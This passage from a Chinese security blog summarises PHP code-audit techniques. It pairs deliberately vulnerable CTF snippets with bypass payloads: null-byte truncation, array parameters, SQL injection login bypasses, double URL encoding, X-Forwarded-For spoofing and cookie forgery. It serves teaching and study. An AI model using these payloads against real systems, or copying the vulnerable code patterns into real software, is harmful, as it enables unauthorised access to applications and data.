$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;

if (isset ($_GET[&#39;password&#39;]))
&#123;
    if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
    &#123;
        echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
    &#125;
    else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
    &#123;
        if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置
        &#123;
            die(&#39;Flag: &#39; . $flag);
        &#125;
        else
        &#123;
            echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);
        &#125;
    &#125;
    else
    &#123;
        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;
    &#125;
&#125;
?&gt;
</code></pre>
<p>ereg函数:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664806850256-c730b620-320c-4e26-8ba7-0bdecd4986a4.png" alt="image.png"><br> 如果有找到模式匹配，则返回true，否则返回false<br>我们可以使用科学计数法绕过前面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807270813-9dd92824-beab-45ce-8c55-12346bc1ab1d.png" alt="image.png"><br>但是它又必须要包含”<em>-</em>“,而ereg已经限制了只能为数字和字母<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807305892-33983499-9772-425b-8e27-72a1dcd8b805.png" alt="image.png"><br>我们可以绕过ereg的检测:<br><strong>方法一 %00截断：</strong><br><strong>payload:</strong></p>
<pre><code class="php">?password=1e9%00*-*
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807530741-53ab0d03-0526-478a-9349-800daeade8ec.png" alt="image.png"><br><strong>方法二  把password通过数组的形式去传参:</strong><br>payload:</p>
<pre><code class="php">?password[]=1e9&amp;password[]=*-*
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664807600826-04801088-c556-44c1-be20-66816ad150da.png" alt="image.png"></p>
<h2 id="session绕过"><a href="#session绕过" class="headerlink" title="session绕过"></a>session绕过</h2><pre><code class="php">&lt;?php

highlight_file(__FILE__);
header(&quot;Content-Type:text/html;charset=utf-8&quot;);

$flag = &quot;flag&#123;this_Is_f1ag&#125;&quot;;

session_start(); 
if (isset ($_GET[&#39;password&#39;])) &#123;
    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])
        die (&#39;Flag: &#39;.$flag);
    else
        print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;
&#125;
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?&gt;
</code></pre>
<p>访问页面，发现生成了session<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808328606-a0f73da1-0a50-4a70-97d4-8d71736bb854.png" alt="image.png"><br>清除session，然后给password传入空值即可<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808375010-3ec57ea9-72da-4371-8819-1f5e688a8661.png" alt="image.png"></p>
<h2 id="密码md5比较绕过"><a href="#密码md5比较绕过" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><pre><code class="php">&lt;?php
header(&quot;Content-Type:text/html;charset=utf-8&quot;);
highlight_file(__FILE__);
//配置数据库
if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;
    $conn = mysql_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;);
    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);
    if ($conn-&gt;connect_error) &#123;
        die(&quot;Connection failed: &quot; . mysql_error($conn));
&#125; 
$user = $_POST[&#39;username&#39;];
$pass = md5($_POST[&#39;password&#39;]);

$sql = &quot;select password from users where username=&#39;$user&#39;&quot;;
//print $sql;
$query = mysql_query($sql);
if (!$query) &#123;
    printf(&quot;Error: %s\n&quot;, mysql_error($conn));
    exit();
&#125;
$row = mysql_fetch_array($query, MYSQL_ASSOC);
if (($row[&#39;password&#39;]) &amp;&amp; (!strcasecmp($pass, $row[&#39;password&#39;]))) &#123;
//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。

    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;
&#125;
else &#123;
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);

&#125;
&#125;
?&gt;
</code></pre>
<p> 只要让row[pw]的值与pass经过md5之后的值相等即可 而$pass经过md5之后的值是我们可以通过正常输入控制的<br>同时，row[pw]的值是从$sql提取出来的<br>目标就一句话：只要我们能够修改$sql的值，此题解决。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664814374666-ee8ceab2-378c-40af-ac86-de012e0bdba0.png" alt="image.png"><br>此时password的值是由我们控制的<br>构造payload:</p>
<pre><code class="php">username=白居易&#39; and 0=1 union select &quot;e10adc3949ba59abbe56e057f20f883e&quot;#&amp;password=123456
</code></pre>
<p>e10adc3949ba59abbe56e057f20f883e是123456的md5值<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815167929-5280d428-308b-483d-a2bf-c6edde20d437.png" alt="image.png"></p>
<h2 id="url二次编码绕过"><a href="#url二次编码绕过" class="headerlink" title="url二次编码绕过"></a>url二次编码绕过</h2><pre><code class="php">&lt;?php
if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;
  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
  exit();
&#125;

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == &quot;hackerDJ&quot;)
&#123;
  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;
&#125;
?&gt;
</code></pre>
<p>二次编码</p>
<pre><code class="php">http://127.0.0.1/test.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815455801-b927b743-9aff-4b31-9f70-0b9ff86d7c2b.png" alt="image.png"></p>
<h2 id="sql闭合绕过"><a href="#sql闭合绕过" class="headerlink" title="sql闭合绕过"></a>sql闭合绕过</h2><pre><code class="php">&lt;?php


if($_POST[user] &amp;&amp; $_POST[pass]) &#123;
    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);
    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);
    if ($conn-&gt;connect_error) &#123;
        die(&quot;Connection failed: &quot; . mysql_error($conn));
&#125; 
$user = $_POST[user];
$pass = md5($_POST[pass]);

//select user from php where (user=&#39;admin&#39;)#

//exp:admin&#39;)#

$sql = &quot;select user from php where (user=&#39;$user&#39;) and (pw=&#39;$pass&#39;)&quot;;
$query = mysql_query($sql);
if (!$query) &#123;
    printf(&quot;Error: %s\n&quot;, mysql_error($conn));
    exit();
&#125;
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row[&quot;pw&quot;];
  if($row[&#39;user&#39;]==&quot;admin&quot;) &#123;
    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;
  &#125;

  if($row[&#39;user&#39;] != &quot;admin&quot;) &#123;
    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);
  &#125;
&#125;

?&gt;
</code></pre>
<p>这个很简单</p>
<pre><code class="php">admin&#39;)#
</code></pre>
<h2 id="x-forwarded-for绕过"><a href="#x-forwarded-for绕过" class="headerlink" title="x-forwarded-for绕过"></a>x-forwarded-for绕过</h2><pre><code class="php">&lt;?php
function GetIP()&#123;
if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))
    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))
    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))
    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];
else
    $cip = &quot;0.0.0.0&quot;;
return $cip;
&#125;

$GetIPs = GetIP();
if ($GetIPs==&quot;1.1.1.1&quot;)&#123;
echo &quot;Great! Key is *********&quot;;
&#125;
else&#123;
echo &quot;错误！你的IP不在访问列表之内！&quot;;
&#125;
?&gt;
</code></pre>
<p> HTTP头添加X-Forwarded-For:1.1.1.1  </p>
<h2 id="intval函数四舍五入"><a href="#intval函数四舍五入" class="headerlink" title="intval函数四舍五入"></a>intval函数四舍五入</h2><pre><code class="php">&lt;?php
if($_GET[id]) &#123;
mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);
mysql_select_db(SAE_MYSQL_DB);
$id = intval($_GET[id]); ## 这里过滤只有一个intval
$query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));
if ($_GET[id]==1024) &#123;
    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
    &#125;
  else&#123;
    echo($query[content]);
  &#125;
&#125;
</code></pre>
<p>payload:</p>
<pre><code class="php">?a=1024.1
</code></pre>
<h2 id="浮点数精度忽略"><a href="#浮点数精度忽略" class="headerlink" title="浮点数精度忽略"></a>浮点数精度忽略</h2><p>intval 函数最大的值取决于操作系统:<br>Copy32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 </p>
<pre><code class="php">if ($req[&quot;number&quot;] != intval($req[&quot;number&quot;]))
</code></pre>
<p> 在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等  </p>
<h2 id="常见截断"><a href="#常见截断" class="headerlink" title="常见截断"></a>常见截断</h2><h3 id="iconv-异常字符截断"><a href="#iconv-异常字符截断" class="headerlink" title="iconv 异常字符截断"></a>iconv 异常字符截断</h3><p> iconv遇到不能识别的内容，会从第一个不能识别的字符开始截断，并生成一个E_NOTICE<br>fuzz一下</p>
<pre><code class="php">&lt;?php
$a =&quot;1.php&quot;;
$b =&quot;.jpg&quot;;
for($i=0; $i&lt;300; $i++)&#123;
    $c = $a.chr($i).$b;
    $d = iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;, $c);
    echo &quot;$i ==&gt; &quot;.$d.&quot;n&quot;;
    echo &quot;\n&quot;;
&#125;
</code></pre>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664851197425-c4dff480-15bc-42b3-b967-1517498a0c2c.png" alt="image.png"></p>
<p>经过测试， chr(128)到chr(255)都可以截断 ，按理说是截断成1.php，可能环境有点问题吧！</p>
<h3 id="eregi、ereg可用-00截断"><a href="#eregi、ereg可用-00截断" class="headerlink" title="eregi、ereg可用%00截断"></a>eregi、ereg可用%00截断</h3><p> 功能：正则匹配过滤 条件：要求php&lt;5.3.4   魔术引号关闭<br>详见上文</p>
<h3 id="move-uploaded-file-用-0截断"><a href="#move-uploaded-file-用-0截断" class="headerlink" title="move_uploaded_file 用\0截断"></a>move_uploaded_file 用\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7 原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生 cve： <a target="_blank" rel="noopener" href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>move_uploaded_file($_FILES[‘x’][‘tmp_name’],”/tmp/test.php\x00.jpg”)<br>上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p>
<h3 id="inclue用-和-截断"><a href="#inclue用-和-截断" class="headerlink" title="inclue用?和#截断"></a>inclue用?和#截断</h3><pre><code class="php">&lt;?php
$name=$_GET[&#39;name&#39;];  
$filename=$name.&#39;.php&#39;;  
include $filename;  
?&gt;
</code></pre>
<p> 当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br><strong>如果能够包含远程文件</strong>时，可以使用?和%23进行伪截断，<strong>该方法对PHP版本没要求</strong>，<strong>但是要求能够包含远程文件,即</strong>allow_url_include=On<br>?原理是把后面的值看成参数，例如<a target="_blank" rel="noopener" href="http://172.17.0.3/1.php?.html">http://172.17.0.3/1.php?.html</a><br>#原理就是前面说的#被include认为是锚点，例如<a target="_blank" rel="noopener" href="http://172.17.0.3/1.txt#.html%EF%BC%8C#%E5%90%8E%E9%9D%A2%E7%9A%84%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E9%94%9A%E7%82%B9(%E4%BD%BF%E7%94%A8url%E7%BC%96%E7%A0%81%E5%90%8E%E7%9A%84#---&gt;%23)">http://172.17.0.3/1.txt#.html，#后面的被认为是锚点(使用url编码后的#---&gt;%23)</a><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852581232-32255fa9-6d2d-4002-8c63-d223c952a637.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852618885-b65805ad-8a9f-4963-870e-bdd63b34158f.png" alt="image.png"></p>
<h2 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h2><p>方法一:%00截断<br>注意点:需将#编码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856729744-a800de1d-40cc-498f-bef1-af960c8429dd.png" alt="image.png"></p>
<p>方法二:数组绕过<br>直接传入一个数组<br>既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856872643-ee08f73b-d6b9-45d2-bf2b-3123fa02afa1.png" alt="image.png"></p>
<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a><strong>十六进制与数字比较</strong></h2><pre><code class="php">&lt;?php

error_reporting(0);
function noother_says_correct($temp)
&#123;
    $flag = &#39;flag&#123;test&#125;&#39;;
    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值
    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值
    $number = &#39;3735929054&#39;;
    // Check all the input characters!
    for ($i = 0; $i &lt; strlen($number); $i++)
    &#123; 
        // Disallow all the digits!
        $digit = ord($temp&#123;$i&#125;);
        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )
        &#123;
            // Aha, digit not allowed!
            return &quot;flase&quot;;
        &#125;
    &#125;
    if($number == $temp)
        return $flag;
&#125;
$temp = $_GET[&#39;password&#39;];
echo noother_says_correct($temp);

?&gt;
</code></pre>
<p> 这里，它不让输入1到9的数字，但是后面却让比较一串数字<br> 在php里面，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872563600-ed999410-6755-4b2a-be29-7d799a66485a.png" alt="image.png"><br>在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872687987-b73ff2a8-2ee9-49e6-92b9-9fa66c50e642.png" alt="image.png"></p>
<h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a><strong>数字验证正则绕过</strong></h2><pre><code class="php">&lt;?php

error_reporting(0);
$flag = &#39;flag&#123;test&#125;&#39;;
if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
&#123; 
    $password = $_POST[&#39;password&#39;]; 
    if (0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配
    &#123; 
        echo &#39;Wrong Format&#39;; 
        exit; 
    &#125; 
    while (TRUE) 
    &#123; 
        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
        if (6 &gt; preg_match_all($reg, $password, $arr)) 
            break; 
        $c = 0; 
        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 
        foreach ($ps as $pt) 
        &#123; 
            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
                $c += 1; 
        &#125; 
        if ($c &lt; 3) break; 
        //&gt;=3，必须包含四种类型三种与三种以上
        if (&quot;42&quot; == $password) echo $flag; 
        else echo &#39;Wrong password&#39;; 
        exit; 
    &#125; 
&#125;

?&gt;
</code></pre>
<p> 意为必须是12个字符以上（非空格非TAB之外的内容）<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878820196-cd2ab7eb-c079-4f8b-8eb4-1a4746b183f2.png" alt="image.png"><br>   意为匹配到的次数要大于6次<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878914886-87653c10-7d3d-4369-8e09-1779ffeda157.png" alt="image.png"><br> 意为必须要有大小写字母，数字，字符内容三种与三种以上<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878981551-c67275d3-8869-4f35-9a40-f5f2b855c653.png" alt="image.png"><br>传入值 必须等于42<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664879091286-6802d5a4-2753-4d70-aae0-ea2e9f48e862.png" alt="image.png"><br>可构造payload:</p>
<pre><code class="php">42.00e+00000000000 
或
420.000000000e-1
</code></pre>
<h2 id="switch没有break-字符与0比较绕过"><a href="#switch没有break-字符与0比较绕过" class="headerlink" title="switch没有break 字符与0比较绕过"></a><strong>switch没有break 字符与0比较绕过</strong></h2><p>首先我们来回顾下switch语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880863864-69ee9b4d-f83f-4999-94de-684c5fa6433f.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880871606-a49b0ffd-3cd2-4ab2-a99b-1e498624758e.png" alt="image.png"><br>匹配到了2，然后2及其2后面的语句都会执行，且不会再进行匹配。<br>那我们接下来看这个题目:</p>
<pre><code class="php">&lt;?php

error_reporting(0);

if (isset($_GET[&#39;which&#39;]))
&#123;
    $which = $_GET[&#39;which&#39;];
    switch ($which)
    &#123;
    case 0:
    case 1:
    case 2:
        require_once $which.&#39;.php&#39;;
         echo $flag;
        break;
    default:
        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);
        break;
    &#125;
&#125;

?&gt;
</code></pre>
<p>直接传入test<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664881120398-f8cbf511-b917-4d02-a540-dc4640c33082.png" alt="image.png"><br>因为当一个字符串与数字比较时，会将字符串转换为数字,传入test后就与0匹配，就不会继续进行匹配了。</p>
<h2 id="利用提交数组绕过逻辑"><a href="#利用提交数组绕过逻辑" class="headerlink" title="利用提交数组绕过逻辑"></a>利用提交数组绕过逻辑</h2><pre><code class="php">&lt;?php 
$role = &quot;guest&quot;;
$flag = &quot;flag&#123;test_flag&#125;&quot;;
$auth = false;
if(isset($_COOKIE[&quot;role&quot;]))&#123;
    $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));
    if($role === &quot;admin&quot;)&#123;
        $auth = true;
    &#125;
    else&#123;
        $auth = false;
    &#125;
&#125;
else&#123;
    $role = base64_encode(serialize($role));
    setcookie(&#39;role&#39;,$role);
&#125;
if($auth)&#123;
    if(isset($_POST[&#39;filename&#39;]))&#123;
        $filename = $_POST[&#39;filename&#39;];
        $data = $_POST[&#39;data&#39;];
        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) &#123;
            die(&#39;No No No!&#39;.$data);
        &#125;
        else &#123;
            $s = implode($data);
            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s))&#123;
                $flag=&#39;None.&#39;;
            &#125;
            $rand = rand(1,10000000);
            $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename;
            file_put_contents($tmp, $flag);
            echo &quot;your file is in &quot; . $tmp;
        &#125;
    &#125;
    else&#123;
        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;
        echo &quot;
there are the source.
&quot;;
        echo &#39;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&#39;;
        echo htmlspecialchars(str_replace($flag,&#39;flag&#123;???&#125;&#39;,file_get_contents(__FILE__)));
        echo &#39;&lt;/textarea&gt;&#39;;
    &#125;
&#125;
else&#123;
    echo &quot;Sorry. You have no permissions.&quot;;
&#125;
?&gt;
</code></pre>
<p>访问页面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882469000-0dd64e6a-ce6b-4b80-8ab9-974ed08e5a16.png" alt="image.png"><br>首先将cookie的用户修改为admin，并替换<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882512840-8c8d4853-af5c-4dac-a0bf-8c9a1e0d6076.png" alt="image.png"><br>然后再次访问，获得题目源码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882543396-6c93429c-9f67-486a-b93c-3eaadd79a6b9.png" alt="image.png"></p>
<p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882956551-bc37572d-7354-434b-a73c-c6c77ce88bea.png" alt="30_1.png"><br> preg_match只能处理字符串，当传入的subject是数组时会返回false<br>想要通过Post请求的形式传入数组可以使用 data[0]=123&amp;data[1]=&lt;&gt; 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &amp;s 为空，成功绕过这段逻辑拿到flag。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882977530-c17d78ee-94a5-482a-b426-04536aece637.png" alt="30_2.png"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/anbus/p/10000571.html">https://www.cnblogs.com/anbus/p/10000571.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11652926.html">https://www.cnblogs.com/-mo-/p/11652926.html</a><br><a target="_blank" rel="noopener" href="http://t.zoukankan.com/drkang-p-8689205.html">http://t.zoukankan.com/drkang-p-8689205.html</a><br><a target="_blank" rel="noopener" href="https://github.com/bowu678/php_bugs">https://github.com/bowu678/php_bugs</a></p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/22/php代码审计总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.</span> <span class="toc-text">php弱类型比较</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%BA%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.</span> <span class="toc-text">弱类型与强类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E"><span class="toc-number">1.2.</span> <span class="toc-text">&#x3D;&#x3D;与&#x3D;&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E6%AF%94%E8%BE%83%E6%93%8D%E4%BD%9C%E7%AC%A6%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">hash比较操作符问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-%E5%92%8C-%E9%83%BD%E9%80%82%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">数组绕过(&#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;都适用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5%E7%A2%B0%E6%92%9E"><span class="toc-number">1.3.2.</span> <span class="toc-text">md5碰撞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0e%E5%BC%80%E5%A4%B4%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9C%A8%E5%8F%82%E4%B8%8E%E6%AF%94%E8%BE%83%E6%97%B6-%E4%BC%9A%E8%A2%AB%E5%BD%93%E5%81%9A%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95-%E7%BB%93%E6%9E%9C%E8%BD%AC%E6%8D%A2%E4%B8%BA0-%E5%BC%B1%E6%AF%94%E8%BE%83-%E6%89%8D%E9%80%82%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0(弱比较&#x3D;&#x3D;才适用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87md5%E6%9E%84%E9%80%A0%E6%81%92%E4%B8%BA%E7%9C%9F%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.3.4.</span> <span class="toc-text">绕过md5构造恒为真语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84md5%E5%80%BC"><span class="toc-number">1.3.5.</span> <span class="toc-text">特殊的md5值</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">十六进制转换问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json%E7%BB%95%E8%BF%87"><span class="toc-number">1.5.</span> <span class="toc-text">json绕过</span></a></li></ol></li><li 